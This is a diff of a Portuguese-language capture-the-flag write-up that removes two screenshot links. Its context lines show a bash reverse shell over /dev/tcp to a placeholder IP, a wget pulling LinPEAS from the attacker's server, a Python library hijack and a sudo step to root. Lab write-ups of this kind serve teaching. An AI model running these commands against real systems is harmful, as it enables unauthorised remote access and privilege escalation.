@@ -74,7 +74,6 @@ Vamos melhorar isso obtendo um _reverse shell_
 > ```bash
 > bash -c 'bash -i >& /dev/tcp/[vpn_ip_address]/[port] 0>&1'
 > ```
-![](reverse.jpg)
 
 ## _**Escalando privilégios**_
 Vamos transferir <mark>LinPEAS</mark> para a máquina-alvo e executar para encontramos uma forma de escalação  
@@ -82,7 +81,6 @@ Não se esqueça de ```python3 -m http.server```
 > ```bash
 > wget http://[ip_address]:[port]/linpeas.sh -O /tmp/linpeas.sh
 > ```
-![](linpeas_result.jpg)
 
 Tentando de algumas maneiras, nenhum sucesso foi obtido  
 Investigando outros arquivos nos usuários, encontramos um suspeito em _/opt_: **test.py**  
@@ -138,7 +136,7 @@ Quando o script for executado e importar essa biblioteca, ele acionará a execu�
 Agora, vamos atrás da flag  
 Executando ```sudo -l```, temos o seguinte  
 
-![](sudo.jpg)  
+![](sudo.jpg)
 
 Basta um ```sudo -i``` e temos _root_
 Também pegamos a flag de **morpheus**
